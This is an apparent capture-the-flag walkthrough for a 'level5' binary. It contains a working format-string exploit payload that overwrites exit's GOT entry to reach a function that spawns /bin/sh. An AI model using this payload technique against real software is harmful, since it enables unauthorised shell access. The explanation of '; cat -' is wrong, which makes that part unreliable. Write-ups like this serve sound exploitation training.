## LEVEL 5 HELP

the level5 binary make call to fgets to get user input on a buffer of 512 bytes.

next the buffer is printed using printf with the format string directly taken from the buffer, leading to a format string vulnerability.

next the binary call exit function.

### USAGE

```bash
./level5
[input]
```

## SOLUTION

``` bash
(python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")'; cat -) | ./level5
```

### COMMAND EXPLANATION
- `\x38\x98\x04\x08` : this is the little-endian address of the `exit` function's GOT entry. You can find this address using gdb or objdump.

- `%134513824d` : this part of the format string writes the value. This value + 4 corresponds to the address of the `function_o` function which call `system('/bin/sh')`.

- `%4$n` : this writes the number of bytes written so far

- `; cat -` : this allows to append a newline character at the end of the input, which is required by fgets.

- `()` : this construct allows to run multiple commands in a single bash command line.